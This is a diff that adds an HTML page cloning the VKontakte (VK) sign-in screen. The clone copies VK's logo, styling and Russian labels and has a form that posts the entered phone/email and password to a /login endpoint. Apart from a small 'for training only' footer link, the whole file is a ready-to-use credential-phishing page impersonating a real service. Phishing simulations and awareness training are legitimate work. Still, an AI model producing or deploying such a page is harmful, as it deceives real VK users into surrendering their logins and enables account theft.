@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Вход | ВКонтакте</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Roboto", "Open Sans", "Helvetica Neue", "Segoe UI", sans-serif;
+            background-color: #ebedf0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: #ffffff;
+            padding: 32px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .logo {
+            width: 44px;
+            height: 44px;
+            margin-bottom: 24px;
+        }
+        h2 {
+            font-size: 20px;
+            margin-bottom: 24px;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 12px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dce1e6;
+            border-radius: 8px;
+            background-color: #f2f3f5;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            outline: none;
+            border-color: #0077ff;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0077ff;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+        button:hover {
+            background-color: #0066de;
+        }
+        .footer-link {
+            margin-top: 24px;
+            color: #818c99;
+            font-size: 14px;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/f/f3/VK_Compact_Logo_%282021-present%29.svg" alt="VK">
+        
+        <h2>Вход ВКонтакте</h2>
+        
+        <form action="/login" method="POST">
+            <input type="text" name="username" placeholder="Телефон или почта" required>
+            <input type="password" name="password" placeholder="Пароль" required>
+            <button type="submit">Войти</button>
+        </form>
+
+        <div style="margin-top: 20px;">
+            <a href="#" class="footer-link">Только для обучения</a>
+        </div>
+    </div>
+
+</body>
+</html>
